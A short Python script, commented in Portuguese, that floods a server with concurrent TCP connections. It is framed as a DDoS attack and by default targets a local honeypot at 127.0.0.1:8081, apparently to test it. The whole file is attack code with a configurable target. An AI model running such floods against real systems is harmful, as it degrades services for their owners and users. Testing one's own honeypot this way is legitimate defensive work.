import socket
import threading
import time

def dos_attack(target_ip, target_port, message, delay=0):
    """Realiza um único ataque enviando mensagens para o servidor de destino."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((target_ip, target_port))
            client.sendall(message.encode('utf-8'))
            print(f"Packet sent to {target_ip}:{target_port}")
            time.sleep(delay)  # Intervalo entre os envios, se configurado
    except Exception as e:
        print(f"Failed to connect to {target_ip}:{target_port} - {e}")


def start_attack(target_ip, target_port, message, num_threads=100, delay=0):
    """Inicia múltiplos ataques simultâneos usando threads."""
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=dos_attack, args=(target_ip, target_port, message, delay))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


if __name__ == "__main__":
    # Configurações do ataque
    target_ip = "127.0.0.1"  # IP do honeypot
    target_port = 8081        # Porta do honeypot
    message = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"  # Payload básico HTTP
    num_threads = 50          # Número de threads simulando conexões simultâneas
    delay = 0.1               # Atraso entre os envios de mensagens em segundos

    print(f"Iniciando ataque DDoS contra {target_ip}:{target_port}...")
    start_attack(target_ip, target_port, message, num_threads, delay)
    print("Ataque concluído.")
